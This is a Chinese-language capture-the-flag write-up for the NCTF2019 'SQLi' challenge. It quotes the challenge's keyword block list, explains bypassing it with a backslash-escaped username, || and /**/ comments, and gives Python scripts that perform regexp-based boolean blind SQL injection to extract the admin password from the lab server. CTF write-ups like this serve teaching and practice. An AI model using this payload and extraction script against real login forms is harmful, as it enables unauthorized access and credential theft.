# [NCTF2019]SQLi regexp 盲注

/robots.txt



<img src="https://i-blog.csdnimg.cn/blog_migrate/a08ddf70394ab6a4c02869561f78a9c2.png" alt="" style="max-height:101px; box-sizing:content-box;" />


访问一下

```swift
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
 
 
If $_POST['passwd'] === admin's password,
 
Then you will get the flag;
```

这里实现了过滤

说需要admin的密码

这里我们可以发现没有过滤 \ 所以username 我们可以通过 \ 来绕过

所以我们通过passwd注入

or 使用 || 代替

然后空格使用 /**/代替

我们尝试登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/a5949c581ae47e3d8426f09e4cea7448.png" alt="" style="max-height:418px; box-sizing:content-box;" />


发现进行302跳转 但是没办法

所以还是要通过 查询admin passwd 进入

所以我们开始

写注入的代码 这里很多都被过滤了

但是放出了 ^和 regexp

正则

我们可以通过正则来读取

和下面的例子一样

```cobol
select (select 'b') > (select 'abc')  这个时候会返回0
 
 
select name regexp "^a"     这里的name是admin   //我自己的数据库
 
返回的是1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5c647ff9fa1a7192c127a3583174f54f.png" alt="" style="max-height:232px; box-sizing:content-box;" />


所以我们可以通过 布尔注入实现这道题的读取

```cobol
import time
from urllib import parse
 
import requests
import string
 
baseurl="http://271f8427-5e33-4411-aae5-90e418285c4f.node4.buuoj.cn:81/"
 
paylaod = '||/**/passwd/**/regexp/**/"^{}";{}'
 
def add(flag):
    res=''
    res += flag
    return  res
flag=''
ascii_chars = string.ascii_letters + string.digits + string.punctuation
print(ascii_chars)
for i in range(20):
    for j in ascii_chars:
        data = add(flag+j)
        paylaod1 = paylaod.format(data,parse.unquote('%00'))
        print(paylaod1)
        data={'username':'\\',
              'passwd':paylaod1}
        re=requests.post(url=baseurl,data=data)
        if re.status_code == 429:
            time.sleep(0.5)
        if "welcome.php" in re.text:
            flag += j
            print(flag)
            break
```

这里很坑 上面的 字符*的时候会循环输出

you*u*u*u

不知道是环境问题还是什么

所以我们现在替换

```cobol
import time
from urllib import parse
 
import requests
import string
 
baseurl="http://271f8427-5e33-4411-aae5-90e418285c4f.node4.buuoj.cn:81/"
 
paylaod = '||/**/passwd/**/regexp/**/"^{}";{}'
 
def add(flag):
    res=''
    res += flag
    return  res
flag=''
ascii_chars = string.ascii_letters+string.digits+"_"
for i in range(20):
    for j in ascii_chars:
        data = add(flag+j)
        paylaod1 = paylaod.format(data,parse.unquote('%00'))
        data={'username':'\\',
              'passwd':paylaod1}
        re=requests.post(url=baseurl,data=data)
        if re.status_code == 429:
            time.sleep(0.5)
        if "welcome.php" in re.text:
            flag += j
            print(flag)
            break
```

这个就可以爆出值了

```cobol
you_will_never_know7788990
```